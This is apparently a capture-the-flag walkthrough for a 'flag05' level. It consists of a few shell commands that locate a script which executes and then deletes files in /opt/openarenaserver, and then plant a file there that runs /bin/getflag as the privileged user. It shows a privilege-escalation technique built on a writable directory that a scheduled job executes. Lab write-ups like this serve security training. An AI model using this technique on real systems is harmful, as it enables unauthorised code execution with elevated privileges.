
```bash
find / -user flag05 2>/dev/null
```

```bash
cat /usr/sbin/openarenaserver 
```

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

```bash
echo "/bin/getflag | wall" >/opt/openarenaserver/file
```